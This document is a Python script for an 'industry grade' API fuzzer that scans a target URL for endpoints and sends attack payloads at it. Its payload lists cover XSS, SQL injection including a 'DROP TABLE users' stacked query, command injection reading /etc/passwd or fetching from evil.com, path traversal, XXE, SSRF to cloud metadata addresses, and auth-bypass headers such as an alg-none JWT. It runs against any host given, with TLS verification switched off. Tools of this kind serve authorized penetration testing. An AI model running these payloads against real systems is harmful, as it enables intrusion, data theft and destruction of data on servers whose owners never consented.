#!/usr/bin/env python3
"""
Advanced API Fuzzer - Industry Grade
Comprehensive API endpoint testing with extensive payloads and attack vectors
"""

import requests
import sys
import json
import time
import base64
import hashlib
from urllib.parse import urljoin, quote, unquote
from collections import defaultdict
import warnings

warnings.filterwarnings('ignore')

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

class APIFuzzerPro:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'API-Fuzzer-Pro/2.0'}
        self.findings = defaultdict(list)
        
        # Comprehensive resource dictionary (500+ resources)
        self.api_resources = self.load_api_resources()
        
        # Attack payloads by category
        self.payloads = self.load_attack_payloads()
        
        # HTTP methods
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        
        # Content types to test
        self.content_types = [
            'application/json',
            'application/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'text/xml',
            'application/graphql',
        ]
        
        # Authentication headers to test
        self.auth_headers = self.load_auth_headers()
    
    def load_api_resources(self):
        """Load comprehensive API resource dictionary"""
        return [
            # User management
            'users', 'user', 'accounts', 'account', 'profile', 'profiles',
            'customer', 'customers', 'client', 'clients', 'member', 'members',
            'admin', 'admins', 'administrator', 'administrators',
            'employee', 'employees', 'staff', 'personnel',
            
            # Authentication & Authorization
            'auth', 'login', 'logout', 'signin', 'signout', 'signup', 'register',
            'token', 'tokens', 'session', 'sessions', 'oauth', 'sso',
            'password', 'reset', 'forgot', 'verify', 'confirm',
            'refresh', 'revoke', 'validate',
            
            # Product & Inventory
            'products', 'product', 'items', 'item', 'catalog', 'inventory',
            'sku', 'skus', 'stock', 'warehouse', 'goods',
            'category', 'categories', 'brand', 'brands',
            'variant', 'variants', 'option', 'options',
            
            # E-commerce
            'cart', 'basket', 'wishlist', 'favorites', 'checkout',
            'order', 'orders', 'purchase', 'transaction', 'transactions',
            'payment', 'payments', 'invoice', 'invoices',
            'shipping', 'delivery', 'tracking', 'fulfillment',
            'coupon', 'coupons', 'discount', 'discounts', 'promo',
            
            # Content Management
            'posts', 'post', 'articles', 'article', 'blog', 'blogs',
            'page', 'pages', 'content', 'media', 'assets',
            'comment', 'comments', 'review', 'reviews', 'rating', 'ratings',
            'tag', 'tags', 'category', 'categories',
            'menu', 'menus', 'navigation',
            
            # File Management
            'file', 'files', 'upload', 'uploads', 'download', 'downloads',
            'document', 'documents', 'attachment', 'attachments',
            'image', 'images', 'photo', 'photos', 'picture', 'pictures',
            'video', 'videos', 'audio', 'media',
            'gallery', 'album', 'folder', 'directory',
            
            # Communication
            'message', 'messages', 'chat', 'conversation', 'conversations',
            'notification', 'notifications', 'alert', 'alerts',
            'email', 'mail', 'sms', 'push',
            'announcement', 'announcements', 'news', 'newsletter',
            
            # Social Features
            'friend', 'friends', 'follower', 'followers', 'following',
            'like', 'likes', 'favorite', 'share', 'shares',
            'activity', 'feed', 'timeline', 'wall',
            
            # Analytics & Reporting
            'analytics', 'stats', 'statistics', 'metrics', 'report', 'reports',
            'dashboard', 'insights', 'data', 'export', 'import',
            'log', 'logs', 'audit', 'history', 'activity',
            
            # Search & Discovery
            'search', 'query', 'find', 'filter', 'sort',
            'autocomplete', 'suggest', 'recommendation', 'recommendations',
            'trending', 'popular', 'featured',
            
            # Settings & Configuration
            'settings', 'config', 'configuration', 'preference', 'preferences',
            'option', 'options', 'parameter', 'parameters',
            'theme', 'themes', 'language', 'locale', 'timezone',
            
            # Business Logic
            'subscription', 'subscriptions', 'plan', 'plans', 'billing',
            'license', 'licenses', 'permit', 'permission', 'permissions',
            'role', 'roles', 'group', 'groups', 'team', 'teams',
            'organization', 'organizations', 'company', 'companies',
            'department', 'departments', 'division',
            
            # Event Management
            'event', 'events', 'calendar', 'schedule', 'appointment',
            'booking', 'reservation', 'ticket', 'tickets',
            'registration', 'attendee', 'attendees',
            
            # Location & Mapping
            'location', 'locations', 'address', 'addresses',
            'city', 'cities', 'country', 'countries', 'region', 'regions',
            'map', 'geo', 'coordinates', 'place', 'places',
            
            # Project Management
            'project', 'projects', 'task', 'tasks', 'todo', 'todos',
            'milestone', 'sprint', 'issue', 'issues', 'bug', 'bugs',
            'ticket', 'tickets', 'board', 'workflow',
            
            # Healthcare (if applicable)
            'patient', 'patients', 'doctor', 'doctors', 'appointment',
            'prescription', 'medical', 'health', 'treatment',
            
            # Education (if applicable)
            'course', 'courses', 'lesson', 'lessons', 'class', 'classes',
            'student', 'students', 'teacher', 'teachers', 'instructor',
            'assignment', 'quiz', 'exam', 'grade', 'grades',
            
            # Financial (if applicable)
            'account', 'accounts', 'balance', 'transaction', 'transactions',
            'transfer', 'deposit', 'withdrawal', 'bank',
            'credit', 'debit', 'card', 'cards',
            
            # System & Admin
            'admin', 'system', 'health', 'status', 'ping', 'version',
            'debug', 'test', 'monitor', 'metrics', 'actuator',
            'backup', 'restore', 'maintenance', 'update',
            
            # API Documentation
            'docs', 'documentation', 'swagger', 'openapi', 'spec',
            'schema', 'help', 'info', 'about',
            
            # Webhooks & Integration
            'webhook', 'webhooks', 'callback', 'callbacks', 'integration',
            'sync', 'import', 'export', 'api', 'service',
        ]
    
    def load_attack_payloads(self):
        """Load comprehensive attack payload dictionary"""
        return {
            'xss': [
                # Basic XSS
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '"><script>alert(1)</script>',
                '\'><script>alert(1)</script>',
                '<iframe src="javascript:alert(1)">',
                '<input onfocus=alert(1) autofocus>',
                
                # Advanced XSS
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x:alert(alt) onerror=eval(src) alt=1>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                '<marquee onstart=alert(1)>',
                
                # Template expressions
                '{{7*7}}',
                '${7*7}',
                '<%=7*7%>',
                '#{7*7}',
                
                # Event handlers
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
            
            'sqli': [
                # Basic SQL injection
                "'",
                "''",
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin' #",
                "admin'/*",
                
                # Union-based
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT 1,2,3--",
                
                # Boolean-based
                "' AND '1'='1",
                "' AND '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--",
                
                # Time-based blind
                "' WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' AND pg_sleep(5)--",
                "1' AND BENCHMARK(5000000,MD5('A'))--",
                
                # Error-based
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                
                # Stacked queries
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('admin','pass')--",
            ],
            
            'nosql': [
                # NoSQL injection
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                '{"username":"admin","password":{"$gt":""}}',
                '{"$where":"sleep(5000)"}',
                '[$ne]=null',
                '{"$or":[{},{"a":"a"}]}',
            ],
            
            'command': [
                # Command injection
                '; ls',
                '| ls',
                '`ls`',
                '$(ls)',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                
                # Windows
                '& dir',
                '| dir',
                '&& dir',
                '|| dir',
                
                # With bypass
                ';ls${IFS}',
                ';cat</etc/passwd',
                ';wget${IFS}evil.com',
            ],
            
            'lfi': [
                # Path traversal
                '../',
                '..\\',
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//etc/passwd',
                
                # URL encoded
                '%2e%2e%2f',
                '%2e%2e%5c',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
                
                # Double encoded
                '%252e%252e%252f',
                
                # Null byte
                '../../../etc/passwd%00',
                '../../../etc/passwd\x00',
                
                # Absolute paths
                '/etc/passwd',
                'C:\\windows\\win.ini',
                '/var/www/html/index.php',
            ],
            
            'xxe': [
                # XXE payloads
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            
            'ssrf': [
                # SSRF payloads
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal',
                'http://[::1]',
                'file:///etc/passwd',
                'gopher://127.0.0.1:25/xHELO',
            ],
            
            'idor': [
                # IDOR payloads
                '1',
                '2',
                '999999',
                '-1',
                '0',
                'admin',
                'administrator',
                'root',
            ],
            
            'type_confusion': [
                # Type confusion
                'null',
                'NULL',
                'undefined',
                'NaN',
                'true',
                'false',
                '[]',
                '{}',
                '0',
                '1',
                '-1',
                '999999999999999',
            ],
            
            'overflow': [
                # Buffer overflow
                'A' * 1000,
                'A' * 10000,
                '9' * 100,
                '%s' * 1000,
            ],
        }
    
    def load_auth_headers(self):
        """Load authentication header variations"""
        return {
            'none': {},
            'invalid_bearer': {'Authorization': 'Bearer INVALID_TOKEN_12345'},
            'malformed_bearer': {'Authorization': 'Bearer '},
            'basic_admin': {'Authorization': 'Basic ' + base64.b64encode(b'admin:admin').decode()},
            'basic_test': {'Authorization': 'Basic ' + base64.b64encode(b'test:test').decode()},
            'api_key_header': {'X-API-Key': 'test_key_12345'},
            'api_key_param': {'api_key': 'test_key_12345'},
            'empty_bearer': {'Authorization': 'Bearer'},
            'jwt_none': {'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.'},
        }
    
    def print_header(self, text):
        """Print section header"""
        print(f"\n{Colors.CYAN}{'='*80}")
        print(f"  {text}")
        print(f"{'='*80}{Colors.END}\n")
    
    def fuzz_endpoint(self, endpoint, method='GET'):
        """Comprehensive endpoint fuzzing"""
        self.print_header(f"FUZZING: {method} {endpoint}")
        
        url = self.base_url + endpoint
        results = []
        
        print(f"{Colors.YELLOW}[*] Testing authentication bypass...{Colors.END}")
        
        # Test authentication variations
        for auth_name, headers in self.auth_headers.items():
            try:
                if method == 'GET':
                    response = self.session.get(url, headers=headers, timeout=5, verify=False)
                elif method == 'POST':
                    response = self.session.post(url, headers=headers, json={}, timeout=5, verify=False)
                else:
                    response = self.session.request(method, url, headers=headers, timeout=5, verify=False)
                
                if response.status_code in [200, 201]:
                    print(f"{Colors.RED}[!] {auth_name}: {response.status_code} ({len(response.text)} bytes){Colors.END}")
                    self.findings['auth_bypass'].append({
                        'endpoint': endpoint,
                        'method': method,
                        'auth': auth_name,
                        'status': response.status_code
                    })
                
                results.append({
                    'auth': auth_name,
                    'status': response.status_code,
                    'length': len(response.text)
                })
            
            except Exception as e:
                pass
        
        print(f"\n{Colors.YELLOW}[*] Testing injection vulnerabilities...{Colors.END}")
        
        # Test injection payloads
        for payload_type, payloads in self.payloads.items():
            if payload_type in ['xss', 'sqli', 'nosql', 'command']:
                for payload in payloads[:5]:  # Test first 5 of each type
                    try:
                        params = {'id': payload, 'q': payload}
                        
                        if method == 'GET':
                            response = self.session.get(url, params=params, timeout=5, verify=False)
                        elif method == 'POST':
                            response = self.session.post(url, json=params, timeout=5, verify=False)
                        else:
                            response = self.session.request(method, url, params=params, timeout=5, verify=False)
                        
                        # Check for reflected payload
                        if payload in response.text and payload_type == 'xss':
                            print(f"{Colors.RED}[!] XSS: Payload reflected{Colors.END}")
                            self.findings['xss'].append({
                                'endpoint': endpoint,
                                'payload': payload
                            })
                        
                        # Check for SQL errors
                        if payload_type == 'sqli' and self.has_sql_error(response.text):
                            print(f"{Colors.RED}[!] SQL: Error detected{Colors.END}")
                            self.findings['sqli'].append({
                                'endpoint': endpoint,
                                'payload': payload
                            })
                    
                    except Exception as e:
                        pass
        
        print(f"\n{Colors.GREEN}[+] Fuzzing complete: {len(results)} tests performed{Colors.END}")
        return results
    
    def has_sql_error(self, response):
        """Check for SQL error patterns"""
        patterns = [
            'sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite',
            'syntax error', 'database error', 'odbc', 'jdbc'
        ]
        response_lower = response.lower()
        return any(pattern in response_lower for pattern in patterns)
    
    def discover_resources(self, base_endpoint='/api'):
        """Comprehensive resource discovery"""
        self.print_header(f"DISCOVERING RESOURCES: {base_endpoint}")
        
        print(f"{Colors.YELLOW}[*] Testing {len(self.api_resources)} resources...{Colors.END}\n")
        
        found = []
        
        for i, resource in enumerate(self.api_resources):
            test_url = self.base_url + base_endpoint + '/' + resource
            
            try:
                response = self.session.get(test_url, timeout=3, verify=False)
                
                if response.status_code in [200, 201, 401, 403, 405]:
                    status_color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                    icon = "✓" if response.status_code == 200 else "🔒" if response.status_code in [401, 403] else "⚠"
                    
                    print(f"{status_color}{icon} /{resource} [{response.status_code}]{Colors.END}")
                    
                    found.append({
                        'resource': resource,
                        'url': test_url,
                        'status': response.status_code,
                        'length': len(response.text)
                    })
            
            except:
                pass
            
            # Progress indicator
            if (i + 1) % 50 == 0:
                print(f"{Colors.CYAN}Progress: {i+1}/{len(self.api_resources)}{Colors.END}")
        
        print(f"\n{Colors.GREEN}[+] Found {len(found)} accessible resources{Colors.END}")
        return found
    
    def test_crud_operations(self, endpoint):
        """Test CRUD operations comprehensively"""
        self.print_header(f"CRUD TESTING: {endpoint}")
        
        url = self.base_url + endpoint
        
        operations = {
            'CREATE (POST)': 'POST',
            'READ (GET)': 'GET',
            'UPDATE (PUT)': 'PUT',
            'PARTIAL UPDATE (PATCH)': 'PATCH',
            'DELETE (DELETE)': 'DELETE',
            'OPTIONS': 'OPTIONS',
            'HEAD': 'HEAD',
        }
        
        results = {}
        
        for name, method in operations.items():
            try:
                if method == 'POST':
                    response = self.session.request(method, url, json={'test': 'data'}, timeout=5, verify=False)
                elif method == 'PUT':
                    response = self.session.request(method, url + '/1', json={'test': 'data'}, timeout=5, verify=False)
                else:
                    response = self.session.request(method, url, timeout=5, verify=False)
                
                status_color = Colors.GREEN if response.status_code < 300 else Colors.YELLOW if response.status_code < 400 else Colors.RED
                
                print(f"{status_color}[{response.status_code}]{Colors.END} {name}")
                
                # Check for dangerous method access
                if method in ['PUT', 'DELETE'] and response.status_code == 200:
                    print(f"  {Colors.RED}[!] Dangerous method accessible{Colors.END}")
                    self.findings['dangerous_methods'].append({
                        'endpoint': endpoint,
                        'method': method
                    })
                
                results[method] = response.status_code
            
            except Exception as e:
                print(f"{Colors.RED}[!] {name}: Error - {str(e)}{Colors.END}")
        
        return results
    
    def test_parameter_pollution(self, endpoint):
        """Test parameter pollution attacks"""
        self.print_header(f"PARAMETER POLLUTION: {endpoint}")
        
        url = self.base_url + endpoint
        
        pollution_tests = [
            {'id': '1', 'id': '2'},  # Duplicate parameter
            {'id[]': '1', 'id[]': '2'},  # Array notation
            {'id[0]': '1', 'id[1]': '2'},  # Array with indices
        ]
        
        for params in pollution_tests:
            try:
                response = self.session.get(url, params=params, timeout=5, verify=False)
                print(f"[{response.status_code}] Params: {params}")
            except:
                pass
    
    def generate_report(self):
        """Generate comprehensive findings report"""
        self.print_header("FINDINGS SUMMARY")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No security issues detected{Colors.END}")
            return
        
        total_findings = sum(len(v) for v in self.findings.values())
        print(f"{Colors.RED}Total Findings: {total_findings}{Colors.END}\n")
        
        for category, items in self.findings.items():
            if items:
                print(f"{Colors.YELLOW}{category.upper().replace('_', ' ')}:{Colors.END}")
                print(f"  Count: {len(items)}")
                for item in items[:3]:
                    print(f"  - {item}")
                if len(items) > 3:
                    print(f"  ... and {len(items) - 3} more")
                print()

def main():
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}Usage: python api_fuzzer_pro.py <base_url> [options]{Colors.END}")
        print(f"\nOptions:")
        print(f"  discover              - Discover resources")
        print(f"  fuzz <endpoint>       - Fuzz specific endpoint")
        print(f"  crud <endpoint>       - Test CRUD operations")
        print(f"  full <endpoint>       - Full testing suite")
        print(f"\nExamples:")
        print(f"  python api_fuzzer_pro.py https://api.example.com discover")
        print(f"  python api_fuzzer_pro.py https://api.example.com fuzz /api/users")
        print(f"  python api_fuzzer_pro.py https://api.example.com full /api")
        sys.exit(1)
    
    base_url = sys.argv[1]
    fuzzer = APIFuzzerPro(base_url)
    
    if len(sys.argv) > 2:
        action = sys.argv[2]
        
        if action == 'discover':
            base = sys.argv[3] if len(sys.argv) > 3 else '/api'
            fuzzer.discover_resources(base)
        
        elif action == 'fuzz' and len(sys.argv) > 3:
            endpoint = sys.argv[3]
            method = sys.argv[4] if len(sys.argv) > 4 else 'GET'
            fuzzer.fuzz_endpoint(endpoint, method)
        
        elif action == 'crud' and len(sys.argv) > 3:
            endpoint = sys.argv[3]
            fuzzer.test_crud_operations(endpoint)
        
        elif action == 'full' and len(sys.argv) > 3:
            endpoint = sys.argv[3]
            fuzzer.discover_resources(endpoint)
            fuzzer.fuzz_endpoint(endpoint)
            fuzzer.test_crud_operations(endpoint)
            fuzzer.test_parameter_pollution(endpoint)
    else:
        fuzzer.discover_resources()
    
    fuzzer.generate_report()

if __name__ == "__main__":
    main()
